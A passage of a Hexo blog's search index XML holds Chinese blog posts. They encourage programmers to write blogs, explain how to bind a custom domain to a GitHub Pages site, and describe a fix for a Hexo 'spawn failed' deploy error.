title”，新建一篇文章。</p><p>然后打开D:\study\program\blog\source_posts的目录，可以发现下面多了一个文件夹和一个.md文件，一个用来存放你的图片等数据，另一个就是你的文章文件啦。</p><p>编写完markdown文件后，根目录下输入hexo g生成静态网页，然后输入hexo s可以本地预览效果，最后输入hexo d上传到github上。这时打开你的github.io主页就能看到发布的文章啦。</p>]]></content>
      
      
      <categories>
          
          <category> 博客 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 博客 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>为什么说程序员都应该写一写博客</title>
      <link href="2018/03/10/2018-leblog/"/>
      <url>2018/03/10/2018-leblog/</url>
      
        <content type="html"><![CDATA[<div align="middle"><iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width="330" height="86" src="//music.163.com/outchain/player?type=2&id=407679465&auto=1&height=66"></iframe></div><h1 id="不是大牛就不能写博客了吗？"><a href="#不是大牛就不能写博客了吗？" class="headerlink" title="不是大牛就不能写博客了吗？"></a>不是大牛就不能写博客了吗？</h1><hr><p>几乎每一个程序员都听说过写博客有很多好处，但真的动手去写的却很少。其中有一个很重要的原因就是，有些人心里会认为：我不是大牛，写出来的博客没意义。</p><blockquote><p>有任何问题请联系我扣扣：1260842695，vx：szhll5201314，24小时随时在线哦<br>如果觉得有用的话可以看心情打赏一杯奶茶，我会很开心哒。</p></blockquote><p><img src="1.png" alt><br><strong>有这种心理很正常，只是每个人表现出来的方式不太一样。</strong>像我五音不全，就非常讨厌去KTV，就算因为公司团建同学聚会实在拗不过别人真的去了，也从来不开口唱，因为怕被别人笑。有些人不爱打扮不是因为完全没有眼光没有审美基础，其实他们也知道什么衣服好看什么衣服不好看，只是因为觉得自己长相普通身材不好，所以就不愿意把时间精力花在这些地方。<strong>归根到底，就是觉得只有出色才应该表现自己。</strong><br><img src="2.png" alt><br><strong>你不是大牛，照样可以写博客。</strong>有一次，我用几个流行的框架组合搭建一个新项目，过程中报了一个错，报错的日志信息不清不楚，完全不知道从何下手。于是就把自己情况提取关键字在网上搜索，看到有一个网友写的博客记录了一模一样的问题，并且提供了他的解决办法。我根据他说的步骤去做，果然就解决了这个问题。他不是大牛，那篇博客也写得非常简单，但是的确解决了这个困扰了我大半天的问题，帮我节省了很多时间。我们在学习工作的时候，也会遇到很多问题，这些问题很有可能别人一样也会遇到。解决问题之后，我们可以把解决过程写成一篇简单的博客，既可以让自己积累经验，也能为其他有需要的网友提供帮助。</p><p><img src="3.png" alt><br><strong>你不是大牛，更应该试试写博客。</strong>无论是程序开发，还是测试运维，吃的这碗饭都是干技术的。技术更新速度非常快，所以我们即便离开了校园照样要学习许多新知识。有些技术大牛，由于经验丰富和技术水平高，面对一个新出来的技术，可能只需要看看官方文档和源代码，再写几个简单的实验小项目就已经熟悉和掌握了。我们不是大牛，有可能因为英文水平不够看不懂官方文档，有可能因为经验不足不知道怎么研究几十万行级别的源代码，甚至有可能不知道要怎么搭建一个使用这个新技术的项目。这时候我们就需要去看书，看技术博客，借助资料去学习，根据别人指出的方向去摸索。这个过程当中，我们就应该试试写博客，把学习笔记写下来，把自己摸索的经历写下来，整理学习的思路，而不是看过就忘、学过就丢。</p><p>#不是大牛就不能写博客了吗？<br>其实这个问题就是一层窗户纸，大家都知道自己能写，而且还有可能可以写得很好。你的博客一定会有其不可替代的意义，既可以为他人提供帮助，也是对自己在学习公众道路上有所助益的一件事。即便你现在的技术水平不高，还是一个刚入门的菜鸟，也一样应该试着写一写博客。</p><h1 id="我的博客历史之红与黑"><a href="#我的博客历史之红与黑" class="headerlink" title="我的博客历史之红与黑"></a>我的博客历史之红与黑</h1><hr><p>写博客是一件并不困难的事，但是也绝对不容易，不然也不会有那么多人还没有开始写自己的第一篇博客。坚持写博客是一件有点困难的事情，在这一点上我深有体会。接下来我想跟大家分享一下近几年来写博客和公众号文章的感想，有很多提起就觉得尴尬的黑历史，也有一些自己觉得很有意义的红历史。</p><p><strong>先从黑历史讲起。</strong>一开始写的博客很烂，现在回头去看简直是辣眼睛。我第一篇在博客园发的博客是讲如何搭建Java Web MVC框架的，直到现在还能在我的博客主页里面看到。当时我还在上大学，其实对web开发和MVC框架都是一窍不通的，结果写出来的东西也是乱七八糟，无论是排版还是内容都惨不忍睹。</p><p><strong>再讲讲红历史。</strong>从我写的第一篇博客开始就给了我很多的鼓励，这主要是体现在阅读量和友好的评论这两方面上。有了大家的鼓励，我才能坚持到现在。写的第一篇我觉得比较好的博客就是《程序猿崛起2》，虽然质量仍然不高，但是比起之前的文章来说，有了自己的观点和想法，显得没有那么空洞。再说说我的公众号，因为读者组成的关系，所以在上面很少会专门谈论技术，主要是写一些我在看书过程中产生的一些想法和观点。受到《暗时间》的影响，我平时看了大量的关于心理学、社会学的书。有的时候每周一篇，有的时候半个月一篇，就这样坚持了三年。现在的写作能力和思考能力，都有了比之前不少的进步。</p><h1 id="互联网最重要的分享-这才是互联网最可贵的互助精神"><a href="#互联网最重要的分享-这才是互联网最可贵的互助精神" class="headerlink" title="互联网最重要的分享,这才是互联网最可贵的互助精神"></a>互联网最重要的分享,这才是互联网最可贵的互助精神</h1><p>写博客写文章的人，都会遇到两个麻烦。第一个麻烦就是有人会泼你冷水，甚至是打着好心提建议的旗号泼你的冷水。不要理会他们的说三道四，直接就把他们拉黑就好。新手一开始需要的是鼓励和认同，绝对不是那些非建设性意见的批评。曾经有个大学同学看了我的文章，说：“你写的没什么内容啊，就是一些大话。”我直接就把他屏蔽掉了。第二个麻烦就是坚持不下去，写了一两篇就再也不写了。首先你要培养对写作的兴趣，感受写文章的快乐。当然了，像我这样会为一个关注数只有四五百的公众号每个星期写文章、每篇文章顶了天一百多阅读数的人来说，如果不是真心喜欢，根本坚持不下来。然后你要想想那些朋友和网友的鼓励，不要辜负他们的一片好心。我经常会特别感谢那些在我的博客下面评论“加油”的人，因为简简单单的几个字就能给我很大的力量，鼓励我继续写下去。我们要相信，只要坚持下去，除了那些找存在感的人泼你冷水，还有更多的热心人给你加油鼓劲。</p><h1 id="实干兴邦，空谈误国"><a href="#实干兴邦，空谈误国" class="headerlink" title="实干兴邦，空谈误国"></a>实干兴邦，空谈误国</h1><p>动动手，让我们开始写一写博客<br>列举了这么多写博客的好处，相信已经有很多人都已经跃跃欲试了。不如趁热打铁，我们现在就花几分钟的时间来体验一下写博客到底要怎么写。不要紧张，这一点都不难，只要接下来一步一步跟着做就可以了。</p><p><strong>最后再多说两句</strong><br>其实分享知识和可以帮助学习工作的方式有很多，并不一定就是要写博客，但这却是最有普及价值和最简单的一种途径。我写这篇文章的初衷，就是希望让更多的人参与到写博客这件有意义的事情中来，从中受益的同时也可以惠及他人。</p>]]></content>
      
      
      <categories>
          
          <category> 博客 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 随笔 </tag>
            
            <tag> 博客 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Hexo 绑定自己的域名</title>
      <link href="2018/01/17/hexo-bang-ding-zi-ji-de-yu-ming/"/>
      <url>2018/01/17/hexo-bang-ding-zi-ji-de-yu-ming/</url>
      
        <content type="html"><![CDATA[<h1 id="Hexo-绑定自己的域名"><a href="#Hexo-绑定自己的域名" class="headerlink" title="Hexo 绑定自己的域名"></a>Hexo 绑定自己的域名</h1><blockquote><p>前提，你得有一个域名，有些域名需要备案后才能用。</p></blockquote><h3 id="在域名解析添加记录"><a href="#在域名解析添加记录" class="headerlink" title="在域名解析添加记录"></a>在域名解析添加记录</h3><p>如果你用你顶点域名（如：hanlele.cn)，就添加一条主机记录为@的，如果你用www子域名（如：<a href="http://www.hnalele.cn）,github绑定自己的域名只支持这两种，不支持其他子域名，你可以去github的help查看" target="_blank" rel="noopener">www.hnalele.cn）,github绑定自己的域名只支持这两种，不支持其他子域名，你可以去github的help查看</a></p><p><img src="https://note.youdao.com/yws/public/resource/a7b28e89afc8e429d20c7293f6faa483/xmlnote/8C10B38C3C154904BF65E557EFE0FD53/2749" alt="域名解析"></p><ul><li>记录类型一定要为 CNAME - 这种类型，只有这样你的域名才能指向你的github<br>记录值填 yourname.github.io</li></ul><h3 id="在github添加自定义域名"><a href="#在github添加自定义域名" class="headerlink" title="在github添加自定义域名"></a>在github添加自定义域名</h3><p><img src="https://note.youdao.com/yws/public/resource/a7b28e89afc8e429d20c7293f6faa483/xmlnote/291DCB7301054795AE30744F12253BB7/2754" alt></p><h3 id="配置hexo的-config-yml"><a href="#配置hexo的-config-yml" class="headerlink" title="配置hexo的_config.yml"></a>配置hexo的_config.yml</h3><p>找到url设置，添加你的域名</p><pre><code># URL 链接设置## If your site is put in a subdirectory, set url as &#39;http://yoursite.com/child&#39; and root as &#39;/child/&#39;url: http://www.hanlele.cnroot: /permalink: :year/:month/:day/:title/permalink_defaults: </code></pre><h3 id="上传CNAME文件"><a href="#上传CNAME文件" class="headerlink" title="上传CNAME文件"></a>上传CNAME文件</h3><p>光执行上面三个步骤还是不够，每次你上传更新时，你在github设置的域名可能会丢失，所以要上传一个CNAME文件，让github记住你添加的域名：<br>先创建一个名为CNAME的文件，没有后缀，再在文件中写上你的域名（如：<a href="http://www.hanlele.cn）,然后把这个文件放在/hexo/source目录下，上传就行了。" target="_blank" rel="noopener">www.hanlele.cn）,然后把这个文件放在/hexo/source目录下，上传就行了。</a></p><h1 id="hexo-搭建个人博客部署环节spawn-failed及解决"><a href="#hexo-搭建个人博客部署环节spawn-failed及解决" class="headerlink" title="hexo 搭建个人博客部署环节spawn failed及解决"></a>hexo 搭建个人博客部署环节spawn failed及解决</h1><p> 我的做法是：</p><ul><li>1、先把git加入系统环境变量；<ul><li>2、再将博客目录里的.git文件夹删除(注意不要永久删除不然有可能数据会丢失)</li><li>3.、命令步骤：<blockquote><p>hexo clean<br>hexo g<br>hexo  d</p></blockquote></li></ul></li></ul><p>4、至此，解决</p><p>最后放上我的报错截图：</p><p>建议：不要使用cmd上传，用Git bash或其他<br><img src="https://note.youdao.com/yws/public/resource/a7b28e89afc8e429d20c7293f6faa483/xmlnote/2A44E55BB64444CB8774E1EFBB468FFD/2784" alt></p>]]></content>
      
      
      <categories>
          
          <category> 博客 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 博客，教程 </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
